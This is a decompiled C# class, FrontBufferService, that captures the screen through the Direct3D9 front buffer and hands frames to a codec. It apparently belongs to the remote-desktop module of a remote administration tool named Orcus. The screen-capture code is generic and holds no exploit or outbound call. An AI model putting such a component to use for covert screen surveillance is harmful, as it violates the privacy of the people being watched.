using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Orcus.Shared.Utilities.Compression;
using SharpDX;
using SharpDX.Direct3D9;
using SharpDX.Mathematics.Interop;

namespace Orcus.Commands.RemoteDesktop.Capture.FrontBuffer;

public class FrontBufferService : IDisposable, IScreenCaptureService
{
	private Device _device;

	private DisplayMode _displayMode;

	private Surface _surface;

	private ScreenHelper _screenHelper;

	private int _currentMonitor;

	public bool IsSupported
	{
		get
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				Direct3D val = new Direct3D();
				try
				{
					DisplayMode adapterDisplayMode = val.GetAdapterDisplayMode(0);
					Device val2 = CreateDevice(val, 0, adapterDisplayMode);
					try
					{
						return true;
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception)
			{
				return false;
			}
		}
	}

	public void Dispose()
	{
		Device device = _device;
		if (device != null)
		{
			((DisposeBase)device).Dispose();
		}
		Surface surface = _surface;
		if (surface != null)
		{
			((DisposeBase)surface).Dispose();
		}
		_device = null;
		_surface = null;
	}

	private static Device CreateDevice(Direct3D direct3D, int monitor, DisplayMode displayMode)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		PresentParameters val = default(PresentParameters);
		val.Windowed = RawBool.op_Implicit(true);
		val.BackBufferCount = 1;
		val.BackBufferHeight = displayMode.Height;
		val.BackBufferWidth = displayMode.Width;
		val.SwapEffect = (SwapEffect)1;
		PresentParameters val2 = val;
		return new Device(direct3D, monitor, (DeviceType)1, IntPtr.Zero, (CreateFlags)32, (PresentParameters[])(object)new PresentParameters[1] { val2 });
	}

	public void Initialize(int monitor)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		Direct3D val = new Direct3D();
		_displayMode = val.GetAdapterDisplayMode(monitor);
		_device = CreateDevice(val, monitor, _displayMode);
		_surface = Surface.CreateOffscreenPlain(_device, _displayMode.Width, _displayMode.Height, (Format)21, (Pool)2);
		_screenHelper = new ScreenHelper();
		_currentMonitor = monitor;
	}

	public void ChangeMonitor(int monitor)
	{
		Dispose();
		Initialize(monitor);
	}

	public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		if (updateCursor)
		{
			_screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);
		}
		_device.GetFrontBufferData(0, _surface);
		DataRectangle val = _surface.LockRectangle((LockFlags)0);
		try
		{
			return streamCodec.CodeImage(val.DataPointer, new Rectangle(0, 0, _displayMode.Width, _displayMode.Height), new Size(_displayMode.Width, _displayMode.Height), (PixelFormat)2498570);
		}
		finally
		{
			_surface.UnlockRectangle();
		}
	}

	public Bitmap CaptureScreen()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		_device.GetFrontBufferData(0, _surface);
		DataRectangle val = _surface.LockRectangle((LockFlags)0);
		Bitmap val2 = new Bitmap(_displayMode.Width, _displayMode.Height, (PixelFormat)139273);
		CopyMemory(val2.LockBits(new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), (ImageLockMode)2, ((Image)val2).get_PixelFormat()).get_Scan0(), val.DataPointer, (uint)(val.Pitch * _displayMode.Height));
		_surface.UnlockRectangle();
		return val2;
	}

	[DllImport("kernel32.dll")]
	public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
}
